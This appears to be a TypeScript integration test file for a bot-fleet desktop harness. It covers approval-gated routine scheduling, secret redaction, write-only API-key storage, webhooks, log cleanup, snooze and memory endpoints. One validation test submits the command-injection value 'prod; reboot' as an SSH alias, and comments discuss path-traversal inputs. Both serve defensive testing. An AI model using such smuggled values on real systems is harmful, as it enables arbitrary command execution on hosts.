      const dump = JSON.parse(readFileSync(fakeClaudeDump, "utf8"));
      const token = dump.mcpConfig.mcpServers.agents.env.OMB_COMMS_TOKEN;
      expect(token).toMatch(/^[a-f0-9]{48}$/);
      const internalHeaders = {
        authorization: `Bearer ${token}`,
        "content-type": "application/json",
      };

      const before = await fetch(
        `${BASE}/api/internal/routines?fromBotId=${encodeURIComponent(bot.id)}&fromThreadId=${encodeURIComponent(bot.threadId)}`,
        { headers: internalHeaders },
      );
      expect(before.status).toBe(200);
      expect(z.object({ routines: z.array(z.unknown()) }).parse(await before.json()).routines).toEqual([]);

      const unavailableCloud = await fetch(`${BASE}/api/internal/routine-requests`, {
        method: "POST",
        headers: internalHeaders,
        body: JSON.stringify({
          fromBotId: bot.id,
          fromThreadId: bot.threadId,
          action: "create",
          routine: {
            name: "Cloud brief",
            instructions: "Summarize today's priorities in the Cloud VM.",
            schedule: { type: "weekly", time: "09:00", weekdays: ["monday"] },
            runOn: "cloud",
          },
        }),
      });
      expect(unavailableCloud.status).toBe(409);
      expect(await unavailableCloud.json()).toMatchObject({
        error: expect.stringMatching(/Box API key|Cloud VM runner/i),
      });

      const proposed = await fetch(`${BASE}/api/internal/routine-requests`, {
        method: "POST",
        headers: internalHeaders,
        body: JSON.stringify({
          fromBotId: bot.id,
          fromThreadId: bot.threadId,
          action: "create",
          routine: {
            name: "Weekday brief",
            instructions: "Summarize the priorities for today.",
            schedule: {
              type: "weekly",
              time: "09:00",
              weekdays: ["monday", "tuesday", "wednesday", "thursday", "friday"],
            },
            runOn: "bot",
            durationMinutes: 30,
          },
        }),
      });
      expect(proposed.status).toBe(201);
      const proposal = z.object({ requestId: z.string() }).passthrough().parse(await proposed.json());

      const stillInert = await api("GET", "/api/routines");
      expect(stillInert.body.routines.filter((routine: { botId: string }) => routine.botId === bot.id)).toEqual([]);
      const state = (await api("GET", "/api/bots")).body;
      const card = state.bots
        .find((candidate: { id: string }) => candidate.id === bot.id)
        ?.messages.find((message: { card?: { requestId?: string } }) => message.card?.requestId === proposal.requestId);
      expect(card?.card).toMatchObject({
        tool: "schedule_routine",
        routineRequest: { botId: bot.id, threadId: bot.threadId },
      });
      expect(card?.card.answered).toBeUndefined();

      const confirmed = await api("POST", `/api/threads/${bot.threadId}/respond`, {
        requestId: proposal.requestId,
        behavior: "allow",
      });
      expect(confirmed).toMatchObject({ status: 200, body: { outcome: "allowed-once", routineAction: "create" } });
      routineId = confirmed.body.resultId;
      await expect.poll(async () => {
        const decisions = (await api("GET", "/api/decisions")).body.decisions;
        return decisions
          .filter((decision: { requestId?: string }) => decision.requestId === proposal.requestId)
          .map((decision: { decision: string; source: string }) => `${decision.decision}:${decision.source}`)
          .sort();
      }).toEqual(["card-shown:routine", "user-approved:user"]);

      const after = await api("GET", "/api/routines");
      expect(after.body.timeZone).toBe(Intl.DateTimeFormat().resolvedOptions().timeZone || "UTC");
      expect(after.body.routines.filter((routine: { botId: string }) => routine.botId === bot.id)).toHaveLength(1);
      const duplicate = await api("POST", `/api/threads/${bot.threadId}/respond`, {
        requestId: proposal.requestId,
        behavior: "allow",
      });
      expect(duplicate.body.alreadySettled).toBe(true);
      expect((await api("GET", "/api/routines")).body.routines
        .filter((routine: { botId: string }) => routine.botId === bot.id)).toHaveLength(1);

      // Calendar-created routines may predate chat-card redaction. Listing
      // them to a model must redact the whole prompt before returning its
      // bounded preview, and tell the model when that preview is incomplete.
      const fakeSecret = `Bearer ${"a".repeat(24)}`;
      const fakeNameSecret = `sk-proj-${"b".repeat(24)}`;
      const legacy = await api("POST", "/api/routines", {
        name: `Legacy ${fakeNameSecret}`,
        prompt: `${fakeSecret}\n${"Review the archive. ".repeat(180)}`,
        botId: bot.id,
        runOn: "bot",
        enabled: false,
        schedule: { type: "daily", time: "10:00", weekdays: [1] },
      });
      legacyRoutineId = legacy.body.routine.id;
      // Exercise the maximum list size with maximum-size instructions without
      // logging or snapshotting any instruction text.
      for (let index = 0; index < 98; index += 1) {
        const bulk = await api("POST", "/api/routines", {
          name: `Budget probe ${index}`,
          prompt: "x".repeat(2_000),
          botId: bot.id,
          runOn: "bot",
          enabled: false,
          schedule: { type: "daily", time: "10:00", weekdays: [1] },
        });
        bulkRoutineIds.push(bulk.body.routine.id);
      }
      expect(legacy.body.routine.schedule.timeZone).toBe(Intl.DateTimeFormat().resolvedOptions().timeZone || "UTC");
      const listed = await fetch(
        `${BASE}/api/internal/routines?fromBotId=${encodeURIComponent(bot.id)}&fromThreadId=${encodeURIComponent(bot.threadId)}`,
        { headers: internalHeaders },
      );
      expect(listed.status).toBe(200);
      const listedBody = z.object({
        routines: z.array(z.object({
          id: z.string(),
          instructionsPreview: z.string(),
          instructionsPreviewTruncated: z.boolean(),
          schedule: z.object({ timeZone: z.string().optional() }).passthrough(),
        }).passthrough()),
      }).parse(await listed.json());
      expect(listedBody.routines).toHaveLength(100);
      expect(Buffer.byteLength(JSON.stringify(listedBody))).toBeLessThan(50_000);
      const legacyResult = listedBody.routines.find((routine) => routine.id === legacyRoutineId)!;
      expect(legacyResult.schedule.timeZone).toBeUndefined();
      expect(legacyResult.instructionsPreview).not.toContain(fakeSecret);
      expect(legacyResult.name).not.toContain(fakeNameSecret);
      expect(legacyResult.instructionsPreview).toContain("redacted");
      expect(legacyResult.instructionsPreviewTruncated).toBe(true);

      const detail = await fetch(
        `${BASE}/api/internal/routines?fromBotId=${encodeURIComponent(bot.id)}&fromThreadId=${encodeURIComponent(bot.threadId)}&routineId=${encodeURIComponent(legacyRoutineId)}`,
        { headers: internalHeaders },
      );
      expect(detail.status).toBe(200);
      const detailBody = z.object({ routine: z.object({ id: z.string(), instructions: z.string() }) }).passthrough().parse(await detail.json());
      expect(detailBody.routine.id).toBe(legacyRoutineId);
      expect(detailBody.routine.instructions.length).toBeGreaterThan(2_000);
      expect(detailBody.routine.instructions).not.toContain(fakeSecret);
      expect(detailBody.routine.instructions).toContain("redacted");
      const hiddenDetail = await fetch(
        `${BASE}/api/internal/routines?fromBotId=${encodeURIComponent(bot.id)}&fromThreadId=${encodeURIComponent(bot.threadId)}&routineId=not-owned-by-this-bot`,
        { headers: internalHeaders },
      );
      expect(hiddenDetail.status).toBe(404);
      const wrongDetailThread = await fetch(
        `${BASE}/api/internal/routines?fromBotId=${encodeURIComponent(bot.id)}&fromThreadId=not-this-bots-thread&routineId=${encodeURIComponent(legacyRoutineId)}`,
        { headers: internalHeaders },
      );
      expect(wrongDetailThread.status).toBe(403);

      // Echoing the bot-facing listing into a normal time edit must not turn
      // its display-only harness zone into a stored recurrence zone.
      const legacyEdit = await fetch(`${BASE}/api/internal/routine-requests`, {
        method: "POST",
        headers: internalHeaders,
        body: JSON.stringify({
          fromBotId: bot.id,
          fromThreadId: bot.threadId,
          action: "update",
          routineId: legacyRoutineId,
          changes: { schedule: { ...legacyResult.schedule, time: "10:30" } },
        }),
      });
      expect(legacyEdit.status).toBe(201);
      const legacyProposal = z.object({ requestId: z.string() }).parse(await legacyEdit.json());
      expect((await api("POST", `/api/threads/${bot.threadId}/respond`, {
        requestId: legacyProposal.requestId,
        behavior: "allow",
      })).status).toBe(200);
      const editedLegacy = (await api("GET", "/api/routines")).body.routines.find(
        (routine: { id: string }) => routine.id === legacyRoutineId,
      );
      expect(editedLegacy.schedule).toMatchObject({ time: "10:30" });
      expect(editedLegacy.scheduleTimeZoneSource).toBe("host");

      // The public representation is itself safe to round-trip.  A generic
      // client can PATCH its copied routine without persisting the effective
      // display zone as a new explicit recurrence zone.
      const echoedLegacy = await api("PATCH", `/api/routines/${legacyRoutineId}`, {
        ...editedLegacy,
        schedule: { ...editedLegacy.schedule, time: "10:45" },
      });
      expect(echoedLegacy.status).toBe(200);
      expect(echoedLegacy.body.routine.schedule).toMatchObject({ time: "10:45" });
      expect(echoedLegacy.body.routine.scheduleTimeZoneSource).toBe("host");

      const wrongThread = await fetch(`${BASE}/api/internal/routine-requests`, {
        method: "POST",
        headers: internalHeaders,
        body: JSON.stringify({
          fromBotId: bot.id,
          fromThreadId: "not-this-bots-thread",
          action: "pause",
          routineId,
        }),
      });
      expect(wrongThread.status).toBe(403);
    } finally {
      for (const bulkRoutineId of bulkRoutineIds) await api("DELETE", `/api/routines/${bulkRoutineId}`);
      if (legacyRoutineId) await api("DELETE", `/api/routines/${legacyRoutineId}`);
      if (routineId) await api("DELETE", `/api/routines/${routineId}`);
      await api("POST", `/api/bots/${bot.id}/interrupt`);
      await api("DELETE", `/api/bots/${bot.id}`);
    }
  }, 60_000);

  it("validates the non-secret VPS alias and keeps old bots on Box by default", async () => {
    const before = await api("GET", "/api/bots");
    const bot = before.body.bots[0];
    expect(bot.cloudBackend).toBeUndefined();

    const bad = await api("PUT", "/api/config", { vps: { sshAlias: "prod; reboot" } });
    expect(bad.status).toBe(400);

    const saved = await api("PUT", "/api/config", { vps: { sshAlias: "production-vps" } });
    expect(saved.status).toBe(200);
    // The per-desktop budget is always resolved in the response, so the client
    // can show what a new desktop will actually get rather than whether
    // someone happened to set it.
    expect(saved.body.vps).toEqual({
      configured: true,
      sshAlias: "production-vps",
      memoryGib: VPS_DEFAULT_MEMORY_GIB,
      cpus: VPS_DEFAULT_CPUS,
    });
    expect(JSON.stringify(saved.body)).not.toContain("privateKey");

    const patched = await api("PATCH", `/api/bots/${bot.id}`, { cloudBackend: "vps" });
    expect(patched.status).toBe(200);
    expect(patched.body.bot.cloudBackend).toBe("vps");
    const autoStart = await api("PATCH", `/api/bots/${bot.id}`, { autoStartVps: true });
    expect(autoStart.status).toBe(200);
    expect(autoStart.body.bot.autoStartVps).toBe(true);
    expect((await api("PATCH", `/api/bots/${bot.id}`, { autoStartVps: "yes" })).status).toBe(400);
    const invalid = await api("PATCH", `/api/bots/${bot.id}`, { cloudBackend: "daytona" });
    expect(invalid.status).toBe(400);
  });

  it("validates a Composio project key, creates a Session, and keeps externally stored secrets off disk", async () => {
    const oldKey = await api("PUT", "/api/config", { composio: { apiKey: "old_key" } });
    expect(oldKey.status).toBe(400);
    expect(oldKey.body.error).toMatch(/start with ak_/i);

    const rejected = await api("PUT", "/api/config", { composio: { apiKey: "ak_wrong" } });
    expect(rejected.status).toBe(400);
    expect(rejected.body.error).toMatch(/invalid project key/i);

    const saved = await api("PUT", "/api/config?secretStorage=external", {
      composio: { apiKey: "ak_good" },
      opencodeGo: { apiKey: "opencode-external" },
      profile: { name: "External Store" },
    });
    expect(saved.status).toBe(200);
    // managedSetup describes the desktop-managed broker; a self-hosted key
    // works without one, so it stays "unconfigured" here.
    expect(saved.body.composio).toEqual({
      configured: true,
      mode: "self-hosted",
      managedSetup: { status: "unconfigured" },
    });
    expect(saved.body.opencodeGo).toEqual({ configured: true });
    expect(saved.body.profile).toEqual({ name: "External Store", email: "" });
    expect(JSON.stringify(saved.body)).not.toContain("ak_good");

    const disk = JSON.parse(readFileSync(join(home, ".botfleet", "config.json"), "utf8"));
    expect(disk.composio).toMatchObject({ apiKey: "", sessionId: "trs_config_test", credentialStorage: "external" });
    expect(disk.opencodeGo).toEqual({ apiKey: "", credentialStorage: "external" });
    expect(disk.profile).toEqual({ name: "External Store" });
    expect(JSON.stringify(disk)).not.toContain("ak_good");
    expect(JSON.stringify(disk)).not.toContain("opencode-external");

    // A later ordinary setting save reloads config; the in-process secure-env
    // override must keep Composio configured until the next app launch.
    expect((await api("PUT", "/api/config", { profile: { name: "Grace" } })).status).toBe(200);
    expect((await api("GET", "/api/config")).body.composio).toEqual({
      configured: true,
      mode: "self-hosted",
      managedSetup: { status: "unconfigured" },
    });

    expect((await api("PUT", "/api/config?secretStorage=external", {
      composio: { apiKey: "" },
      opencodeGo: { apiKey: "" },
    })).status).toBe(200);
    const cleared = JSON.parse(readFileSync(join(home, ".botfleet", "config.json"), "utf8"));
    expect(cleared.composio.credentialStorage).toBeUndefined();
    expect(cleared.opencodeGo.credentialStorage).toBeUndefined();
  });

  it.skipIf(process.platform === "win32")("stores the credentials file with owner-only permissions", () => {
    expect(statSync(join(home, ".botfleet", "config.json")).mode & 0o777).toBe(0o600);
  });

  it("stores and echoes the user profile (not write-only, unlike keys)", async () => {
    const put = await api("PUT", "/api/config", { profile: { name: "Ada Lovelace", email: "Ada@Example.com" } });
    expect(put.status).toBe(200);
    expect(put.body.profile).toEqual({ name: "Ada Lovelace", email: "Ada@Example.com" });

    const after = await api("GET", "/api/config");
    expect(after.body.profile).toEqual({ name: "Ada Lovelace", email: "Ada@Example.com" });
  });

  it("creates an independent webhook, accepts a delivery, deduplicates it, and rotates its secret", async () => {
    const bots = await api("GET", "/api/bots");
    const created = await api("POST", "/api/webhooks", {
      name: "Incoming build",
      prompt: "Review the incoming build event",
      botId: bots.body.bots[0].id,
      runOn: "bot",
    });
    expect(created.status).toBe(201);
    expect(created.body.ingress).toMatchObject({ available: true, baseUrl: WEBHOOK_BASE });
    expect(created.body.credential.url).toMatch(new RegExp(`^${WEBHOOK_BASE}/hooks/wh_`));

    const listed = await api("GET", "/api/webhooks");
    expect(listed.body.webhooks).toHaveLength(1);
    expect(listed.body.attempts).toEqual([]);
    expect(JSON.stringify(listed.body)).not.toContain(created.body.credential.secret);

    const deliver = () => fetch(created.body.credential.url, {
      method: "POST",
      headers: { "content-type": "application/json", "idempotency-key": "build-42" },
      body: JSON.stringify({ status: "failed", build: 42 }),
    });
    const first = await deliver();
    expect(first.status).toBe(202);
    const accepted = await first.json() as { runId: string; accepted: boolean; duplicate: boolean };
    expect(accepted).toMatchObject({ accepted: true, duplicate: false });
    const retry = await deliver();
    expect(retry.status).toBe(202);
    expect(await retry.json()).toMatchObject({ accepted: true, duplicate: true, runId: accepted.runId });

    const afterDelivery = await api("GET", "/api/webhooks");
    expect(afterDelivery.body.attempts.map((attempt: { outcome: string }) => attempt.outcome)).toEqual(["accepted", "duplicate"]);

    const receipts = await api("GET", "/api/routines");
    expect(receipts.body.runs.find((run: { id: string }) => run.id === accepted.runId)).toMatchObject({
      triggerSource: "webhook",
      deliveryId: "build-42",
      routineName: "Incoming build",
    });

    const rotated = await api("POST", `/api/webhooks/${created.body.webhook.id}/rotate`);
    expect(rotated.status).toBe(200);
    expect(rotated.body.credential.url).not.toBe(created.body.credential.url);
    expect((await deliver()).status).toBe(401);

    expect((await api("DELETE", `/api/webhooks/${created.body.webhook.id}`)).status).toBe(200);
    expect((await api("GET", "/api/webhooks")).body.webhooks).toHaveLength(0);
    if (process.platform !== "win32") {
      expect(statSync(join(home, ".botfleet", "webhooks.json")).mode & 0o777).toBe(0o600);
    }
  });

  it("stores OpenCode Go credentials as a configured-only status", async () => {
    const put = await api("PUT", "/api/config", { opencodeGo: { apiKey: "opencode-secret" } });
    expect(put.status).toBe(200);
    expect(put.body.opencodeGo).toEqual({ configured: true });
    expect(JSON.stringify(put.body)).not.toContain("opencode-secret");

    const after = await api("GET", "/api/config");
    expect(after.body.opencodeGo).toEqual({ configured: true });
    expect(JSON.stringify(after.body)).not.toContain("opencode-secret");
  });

  it("stores the avatar image key as configured-only status", async () => {
    try {
      const put = await api("PUT", "/api/config", { imageGen: { key: "sk-image-secret" } });
      expect(put.status).toBe(200);
      expect(put.body.imageGen).toEqual({ configured: true });
      expect(JSON.stringify(put.body)).not.toContain("sk-image-secret");

      const after = await api("GET", "/api/config");
      expect(after.body.imageGen).toEqual({ configured: true });
      expect(JSON.stringify(after.body)).not.toContain("sk-image-secret");
    } finally {
      await api("PUT", "/api/config", { imageGen: { key: "" } });
    }
  });

  it("rejects a non-string OpenCode Go API key", async () => {
    const bad = await api("PUT", "/api/config", { opencodeGo: { apiKey: 123 } });
    expect(bad.status).toBe(400);
    expect(bad.body.error).toContain("opencodeGo.apiKey");

    const array = await api("PUT", "/api/config", { opencodeGo: [] });
    expect(array.status).toBe(400);
    expect(array.body.error).toContain("opencodeGo");
  });

  it("never hands a client the provider session cursors", async () => {
    // resumeCursors is the harness's own bookkeeping. It reached clients for
    // a long time as harmless noise; once a phone is a client it is provider
    // session state leaving the machine, so nothing carrying a bot may have it.
    const listed = await api("GET", "/api/bots");
    for (const bot of listed.body.bots) {
      expect(bot).not.toHaveProperty("resumeCursors");
      for (const task of bot.tasks ?? []) expect(task).not.toHaveProperty("resumeCursors");
    }

    const created = await api("POST", "/api/bots");
    const botId = created.body.bot.id;
    try {
      expect(created.body.bot).not.toHaveProperty("resumeCursors");
      const patched = await api("PATCH", `/api/bots/${botId}`, { name: "Cursorless" });
      expect(patched.body.bot).not.toHaveProperty("resumeCursors");

      const task = await api("POST", `/api/bots/${botId}/tasks`, {});
      expect(task.body.bot).not.toHaveProperty("resumeCursors");
      for (const t of task.body.bot.tasks ?? []) expect(t).not.toHaveProperty("resumeCursors");
      // the task alone, not just the bot it came attached to
      expect(task.body.task).not.toHaveProperty("resumeCursors");
      const renamed = await api("PATCH", `/api/bots/${botId}/tasks/${task.body.task.threadId}`, {
        title: "Cursorless task",
      });
      expect(renamed.body.task).not.toHaveProperty("resumeCursors");

      // and the same on the wire, not just in the HTTP responses
      const stream = await openSse(`${BASE}/api/events`);
      try {
        await api("PATCH", `/api/bots/${botId}`, { unread: true });
        const frame = await stream.until((f) => f.kind === "bot");
        expect(frame.bot).not.toHaveProperty("resumeCursors");
        expect(JSON.stringify(frame)).not.toContain("resumeCursors");
      } finally {
        stream.close();
      }
    } finally {
      await api("DELETE", `/api/bots/${botId}`);
    }
  });

  it("validates the event inspector limit at the HTTP boundary", async () => {
    const bot = (await api("GET", "/api/bots")).body.bots[0];
    for (const value of ["nope", "0", "-1", "1.5", "Infinity"]) {
      const response = await api("GET", `/api/threads/${bot.threadId}/events?limit=${value}`);
      expect(response.status).toBe(400);
      expect(response.body.error).toContain("positive whole number");
    }
    const ok = await api("GET", `/api/threads/${bot.threadId}/events?limit=1`);
    expect(ok.status).toBe(200);
    expect(Array.isArray(ok.body.entries)).toBe(true);
    expect(ok.body.total).toEqual({ runtime: expect.any(Number), native: expect.any(Number) });
  });

  it("404s unknown routes with the route in the error", async () => {
    const res = await api("GET", "/api/definitely-not-a-route");
    expect(res.status).toBe(404);
    expect(res.body.error).toContain("/api/definitely-not-a-route");
  });
});

describe("transcript logs on delete", () => {
  /** Both generations plus a killed trim's leftovers, for one thread. */
  const logFiles = (threadId: string) =>
    ["events", "native"].flatMap((dir) => [
      join(home, ".botfleet", dir, `${threadId}.ndjson`),
      join(home, ".botfleet", dir, `${threadId}.ndjson.1`),
      join(home, ".botfleet", dir, `${threadId}.ndjson.4242.123e4567-e89b-42d3-a456-426614174000.tmp`),
    ]);

  it("removes every task's logs, both generations and temp files, when a bot is deleted", async () => {
    const bot = (await api("POST", "/api/bots")).body.bot;
    const first = bot.threadId;
    const task = await api("POST", `/api/bots/${bot.id}/tasks`, { title: "Second task" });
    expect(task.status).toBe(201);
    const second = task.body.task.threadId;
    expect(second).not.toBe(first);

    // A bot's `threadId` names only its ACTIVE task, so a delete that used it
    // alone orphaned every other task's transcript forever.
    const files = [...logFiles(first), ...logFiles(second)];
    for (const file of files) writeFileSync(file, "{}\n");

    expect((await api("DELETE", `/api/bots/${bot.id}`)).status).toBe(200);
    expect(files.filter((file) => existsSync(file))).toEqual([]);
  });

  it("removes a bot task's logs when just that task is deleted", async () => {
    const bot = (await api("POST", "/api/bots")).body.bot;
    const kept = bot.threadId;
    const task = await api("POST", `/api/bots/${bot.id}/tasks`, { title: "Throwaway" });
    expect(task.status).toBe(201);
    const gone = task.body.task.threadId;
    for (const file of [...logFiles(kept), ...logFiles(gone)]) writeFileSync(file, "{}\n");

    expect((await api("DELETE", `/api/bots/${bot.id}/tasks/${gone}`)).status).toBe(200);
    expect(logFiles(gone).filter((file) => existsSync(file))).toEqual([]);
    // the task that stayed keeps its history
    expect(logFiles(kept).every((file) => existsSync(file))).toBe(true);
    await api("DELETE", `/api/bots/${bot.id}`);
  });

  it("removes the merged-away thread's logs when two tasks are merged", async () => {
    const bot = (await api("POST", "/api/bots")).body.bot;
    const kept = bot.threadId;
    const task = await api("POST", `/api/bots/${bot.id}/tasks`, { title: "Folded in" });
    expect(task.status).toBe(201);
    const gone = task.body.task.threadId;
    for (const file of [...logFiles(kept), ...logFiles(gone)]) writeFileSync(file, "{}\n");

    // a merge copies the source's messages into the target and deletes the
    // source task, so nothing names the source thread afterwards
    const merged = await api("PATCH", `/api/bots/${bot.id}/tasks/${gone}`, { mergeInto: kept });
    expect(merged.status).toBe(200);
    expect(logFiles(gone).filter((file) => existsSync(file))).toEqual([]);
    expect(logFiles(kept).every((file) => existsSync(file))).toBe(true);
    await api("DELETE", `/api/bots/${bot.id}`);
  });

  it("removes a room task's logs when just that task is deleted", async () => {
    const bot = (await api("POST", "/api/bots")).body.bot;
    const room = (await api("POST", "/api/groups", { name: "Task cleanup", memberIds: [bot.id] })).body.group;
    const kept = room.threadId;
    const task = await api("POST", `/api/groups/${room.id}/tasks`, { title: "Throwaway" });
    expect(task.status).toBe(201);
    const gone = task.body.task.threadId;
    for (const file of [...logFiles(kept), ...logFiles(gone)]) writeFileSync(file, "{}\n");

    expect((await api("DELETE", `/api/groups/${room.id}/tasks/${gone}`)).status).toBe(200);
    expect(logFiles(gone).filter((file) => existsSync(file))).toEqual([]);
    expect(logFiles(kept).every((file) => existsSync(file))).toBe(true);
    await api("DELETE", `/api/groups/${room.id}`);
    await api("DELETE", `/api/bots/${bot.id}`);
  });

  it("removes every task's logs when a room is deleted", async () => {
    const bot = (await api("POST", "/api/bots")).body.bot;
    const room = (await api("POST", "/api/groups", { name: "Log cleanup", memberIds: [bot.id] })).body.group;
    const task = await api("POST", `/api/groups/${room.id}/tasks`, { title: "Second task" });
    expect(task.status).toBe(201);
    const files = [...logFiles(room.threadId), ...logFiles(task.body.task.threadId)];
    for (const file of files) writeFileSync(file, "{}\n");

    expect((await api("DELETE", `/api/groups/${room.id}`)).status).toBe(200);
    expect(files.filter((file) => existsSync(file))).toEqual([]);
    await api("DELETE", `/api/bots/${bot.id}`);
  });
});

describe("per-thread snooze over HTTP", () => {
  // One bot for the whole block. Creating and deleting a bot per test is the
  // slow part of this file, and none of these cases dirty the other's state.
  let botId = "";
  let awake = "";
  let asleep = "";

  beforeAll(async () => {
    const bot = (await api("POST", "/api/bots")).body.bot;
    botId = bot.id;
    awake = bot.threadId;
    const created = await api("POST", `/api/bots/${botId}/tasks`, { title: "Quiet one" });
    expect(created.status).toBe(201);
    asleep = created.body.task.threadId;
  }, 30_000);

  afterAll(async () => {
    if (botId) await api("DELETE", `/api/bots/${botId}`);
  });

  it("snoozes one thread, leaves its siblings awake, and wakes it on an explicit null", async () => {
    // 0 is the until-activity sentinel — a real value on the wire, never
    // "no snooze".
    const snoozed = await api("PATCH", `/api/bots/${botId}/tasks/${asleep}`, { snoozedUntil: 0 });
    expect(snoozed.status).toBe(200);
    expect(snoozed.body.task.snoozedUntil).toBe(0);

    const roster = (await api("GET", "/api/bots")).body.bots.find((b: any) => b.id === botId);
    const byThread = (threadId: string) => roster.tasks.find((t: any) => t.threadId === threadId);
    expect(byThread(asleep).snoozedUntil).toBe(0);
    expect(byThread(awake).snoozedUntil).toBeUndefined();

    // A rename omits the field, and an omitted field means "leave it alone".
    const renamed = await api("PATCH", `/api/bots/${botId}/tasks/${asleep}`, { title: "Still quiet" });
    expect(renamed.status).toBe(200);
    expect(renamed.body.task.snoozedUntil).toBe(0);

    const woken = await api("PATCH", `/api/bots/${botId}/tasks/${asleep}`, { snoozedUntil: null });
    expect(woken.status).toBe(200);
    expect(woken.body.task.snoozedUntil).toBeUndefined();
  }, 30_000);

  it("heals a deadline that has already passed on read, against the harness clock", async () => {
    const past = await api("PATCH", `/api/bots/${botId}/tasks/${awake}`, {
      snoozedUntil: Date.now() - 60_000,
    });
    expect(past.status).toBe(200);
    // Stored, but never handed out: a phone whose clock is minutes off still
    // agrees with the desktop about whether the thread is asleep.
    expect(past.body.task.snoozedUntil).toBeUndefined();

    const roster = (await api("GET", "/api/bots")).body.bots.find((b: any) => b.id === botId);
    expect(roster.tasks.find((t: any) => t.threadId === awake).snoozedUntil).toBeUndefined();

    const future = await api("PATCH", `/api/bots/${botId}/tasks/${awake}`, {
      snoozedUntil: Date.now() + 3_600_000,
    });
    expect(future.body.task.snoozedUntil).toEqual(expect.any(Number));
    await api("PATCH", `/api/bots/${botId}/tasks/${awake}`, { snoozedUntil: null });
  }, 30_000);

  it("refuses anything that is not a timestamp, 0, or null, and 404s an unknown thread", async () => {
    for (const snoozedUntil of ["tomorrow", -1, true, {}]) {
      const res = await api("PATCH", `/api/bots/${botId}/tasks/${awake}`, { snoozedUntil });
      expect(res.status).toBe(400);
      expect(res.body.error).toMatch(/snoozedUntil/);
    }
    expect(
      (await api("PATCH", `/api/bots/${botId}/tasks/missing-thread`, { snoozedUntil: 0 })).status,
    ).toBe(404);
  }, 30_000);
});

describe("section context API", () => {
  it("keeps user-managed briefs isolated by live section and clears them explicitly", async () => {
    const work = (await api("POST", "/api/bots")).body.bot;
    const personal = (await api("POST", "/api/bots")).body.bot;
    try {
      await api("PATCH", `/api/bots/${work.id}`, { section: "Work" });
      await api("PATCH", `/api/bots/${personal.id}`, { section: "Personal" });

      const saved = await api("PUT", "/api/section-context?section=Work", { text: "# Goals\n- Ship Friday" });
      expect(saved.status).toBe(200);
      expect(saved.body).toMatchObject({ section: "Work", label: "Work", text: "# Goals\n- Ship Friday" });
      expect(saved.body.updatedAt).toEqual(expect.any(Number));

      const read = await api("GET", "/api/section-context?section=%20Work%20");
      expect(read.body.text).toBe("# Goals\n- Ship Friday");
      expect((await api("GET", "/api/section-context?section=Personal")).body.text).toBe("");
      expect((await api("GET", "/api/section-context?section=")).body.label).toBe("General");

      const cleared = await api("PUT", "/api/section-context?section=Work", { text: "  " });
      expect(cleared.body).toMatchObject({ text: "", updatedAt: null });
      expect((await api("GET", "/api/section-context?section=Work")).body.text).toBe("");
    } finally {
      await api("DELETE", `/api/bots/${work.id}`);
      await api("DELETE", `/api/bots/${personal.id}`);
    }
  });

  it("rejects missing, unknown, invalid, and oversized section context writes", async () => {
    expect((await api("GET", "/api/section-context")).status).toBe(400);
    expect((await api("PUT", "/api/section-context?section=Missing", { text: "x" })).status).toBe(404);
    expect((await api("PUT", "/api/section-context?section=", { text: 7 })).status).toBe(400);
    const oversized = await api("PUT", "/api/section-context?section=", { text: "x".repeat(24_001) });
    expect(oversized.status).toBe(400);
    expect(oversized.body.error).toContain("24KB");
  });
});

// The memory routes expose plain files in the bot's workspace. The
// traversal cases matter more than the happy path here: a topic name in a
// URL is hostile-adjacent input, and the only defensible answer to "../"
// in any coat of encoding is a rejection before the filesystem is touched.
describe("bot memory API", () => {
  /** raw-path GET: fetch() normalizes "../" segments away client-side, and
   * the traversal tests need the wire to carry exactly the bytes shown */
  const rawGet = (rawPath: string): Promise<{ status: number; text: string }> =>
    new Promise((resolve, reject) => {
      const req = request({ hostname: "127.0.0.1", port: PORT, path: rawPath }, (res) => {
        let text = "";
        res.on("data", (c) => (text += c));
        res.on("end", () => resolve({ status: res.statusCode ?? 0, text }));
      });
      req.on("error", reject);
      req.end();
    });

  const workspaceOf = (botId: string) => join(home, ".botfleet", "workspaces", botId);

  it("reads empty memory for a fresh bot and 404s a bot that does not exist", async () => {
    const bot = (await api("POST", "/api/bots")).body.bot;
    try {
      const fresh = await api("GET", `/api/bots/${bot.id}/memory`);
      expect(fresh.status).toBe(200);
      expect(fresh.body).toEqual({ text: "", truncated: false, topics: [] });
      expect((await api("GET", "/api/bots/does-not-exist/memory")).status).toBe(404);
    } finally {
      await api("DELETE", `/api/bots/${bot.id}`);
    }
  });

  it("round-trips a MEMORY.md edit and rejects non-string or oversized text", async () => {
    const bot = (await api("POST", "/api/bots")).body.bot;
    try {
      const saved = await api("PUT", `/api/bots/${bot.id}/memory`, { text: "# Memory\n- prefers pnpm\n" });
      expect(saved.status).toBe(200);
      expect(saved.body.truncated).toBe(false);
      const read = await api("GET", `/api/bots/${bot.id}/memory`);
      expect(read.body.text).toBe("# Memory\n- prefers pnpm\n");
      // the write lands in the same file the bot's own tools read
      expect(readFileSync(join(workspaceOf(bot.id), "MEMORY.md"), "utf8")).toContain("prefers pnpm");

      expect((await api("PUT", `/api/bots/${bot.id}/memory`, { text: 7 })).status).toBe(400);
      expect((await api("PUT", `/api/bots/${bot.id}/memory`, {})).status).toBe(400);
      const big = await api("PUT", `/api/bots/${bot.id}/memory`, { text: "x".repeat(256 * 1024 + 1) });
      expect(big.status).toBe(400);
      expect(big.body.error).toContain("256KB");
      // a rejected write must leave the file exactly as it was
      expect((await api("GET", `/api/bots/${bot.id}/memory`)).body.text).toBe("# Memory\n- prefers pnpm\n");
      expect((await api("PUT", "/api/bots/does-not-exist/memory", { text: "x" })).status).toBe(404);
    } finally {
      await api("DELETE", `/api/bots/${bot.id}`);
    }
  });

  it("lists memory/ topic files and serves one by (possibly encoded) name", async () => {
    const bot = (await api("POST", "/api/bots")).body.bot;
    try {
      const memDir = join(workspaceOf(bot.id), "memory");
      mkdirSync(memDir, { recursive: true });
      writeFileSync(join(memDir, "deploys.md"), "- deploy = pnpm ship\n");
      writeFileSync(join(memDir, "my notes.md"), "spaced");
      writeFileSync(join(memDir, "notes.txt"), "not a topic");
      const listed = await api("GET", `/api/bots/${bot.id}/memory`);
      expect(listed.body.topics).toEqual([
        { name: "deploys.md", bytes: 21 },
        { name: "my notes.md", bytes: 6 },
      ]);

      const topic = await api("GET", `/api/bots/${bot.id}/memory/topics/deploys.md`);
      expect(topic.status).toBe(200);
      expect(topic.body).toEqual({ name: "deploys.md", text: "- deploy = pnpm ship\n" });
      // a UI-sent name arrives percent-encoded and must resolve to the same file
